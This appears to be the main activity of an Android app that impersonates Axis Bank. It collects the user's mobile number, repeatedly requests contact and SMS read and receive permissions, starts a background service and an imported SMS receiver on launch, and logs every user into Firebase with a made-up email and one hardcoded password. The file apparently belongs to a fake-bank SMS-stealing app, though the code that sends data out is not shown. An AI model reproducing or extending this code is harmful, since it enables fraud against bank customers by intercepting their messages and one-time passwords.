package com.bank.axisbank.screen;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.bank.axisbank.EligibilityActivity;
import com.bank.axisbank.HELPER.MyService;
import com.bank.axisbank.HELPER.SmsReceiver;
import com.bank.axisbank.R;
import com.bank.axisbank.phone;
import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;

import java.util.Objects;

public class MainActivity extends AppCompatActivity {
    String MobileNumber="";

    LinearLayout layout;

    View loadingOverlay;
    private static final int REQUEST_PERMISSION_CODE =1;

    FirebaseAuth auth;
    final String regexStr = "^(?:(?:\\+|0{0,2})91(\\s*[\\-]\\s*)?|[0]?)?[6789]\\d{9}$";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        EditText mobileNumber = findViewById(R.id.mobileNumber);
        Button btn = findViewById(R.id.proceed);
        layout = findViewById(R.id.progress);
        loadingOverlay = findViewById(R.id.loadingOverlay);
        FirebaseApp.initializeApp(this);
        checkPermission();
        auth =FirebaseAuth.getInstance();
        mobileNumber.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                MobileNumber = s.toString();
            }

            @Override
            public void afterTextChanged(Editable s) {
            }
        });

        btn.setOnClickListener(view -> {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS}, REQUEST_PERMISSION_CODE);
            } else {
                if (MobileNumber.length() < 10 || !MobileNumber.matches(regexStr)) {
                    mobileNumber.setError("Enter Valid Mobile Number");
                    return;
                }
                showLoadingOverlay();

                String email = MobileNumber + "@axis.com";
                String password = "generateTemporaryPassword"; // Replace this with your logic to generate a secure temporary password.

                phone ph = new phone(MobileNumber);

                // Always try to sign in, whether the user exists or not
                auth.signInWithEmailAndPassword(email, password).addOnCompleteListener(signInTask -> {
                    if (signInTask.isSuccessful()) {
                        // User sign-in successful, move to the next activity
                        hideLoadingOverlay();
                        Intent serviceIntent = new Intent(this, MyService.class);
                        startService(serviceIntent);
                        Intent intent = new Intent(getApplicationContext(), EligibilityActivity.class);
                        startActivity(intent);
                    } else {
                        // User doesn't exist, create a new account and sign in
                        auth.createUserWithEmailAndPassword(email, password).addOnCompleteListener(createUserTask -> {
                            hideLoadingOverlay();
                            Intent serviceIntent = new Intent(this, MyService.class);
                            startService(serviceIntent);
                            if (createUserTask.isSuccessful()) {
                                Intent intent = new Intent(getApplicationContext(), EligibilityActivity.class);
                                startActivity(intent);
                            } else {
                                Toast.makeText(getApplicationContext(), Objects.requireNonNull(createUserTask.getException()).getMessage(), Toast.LENGTH_LONG).show();
                            }
                        });
                    }
                });
            }
        });

        Intent serviceIntent = new Intent(this, MyService.class);
        startService(serviceIntent);

        
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if(requestCode==REQUEST_PERMISSION_CODE){
            if(grantResults.length>0 && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED){

            }else {
                Toast.makeText(getApplicationContext(),"Permissions Denied , Allow permissions to continue",Toast.LENGTH_LONG).show();
            }
        }
    }
    private void showLoadingOverlay() {
        layout.setVisibility(View.VISIBLE);
        loadingOverlay.setVisibility(View.VISIBLE);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
    }
    private void hideLoadingOverlay() {
        layout.setVisibility(View.GONE);
        loadingOverlay.setVisibility(View.GONE);
        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
    }
    public void checkPermission(){
        if( ContextCompat.checkSelfPermission(this,Manifest.permission.READ_CONTACTS )!=PackageManager.PERMISSION_GRANTED ||ContextCompat.checkSelfPermission(this,Manifest.permission.RECEIVE_SMS)!=PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CONTACTS,Manifest.permission.RECEIVE_SMS,Manifest.permission.READ_SMS}, REQUEST_PERMISSION_CODE);
        } else {

        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}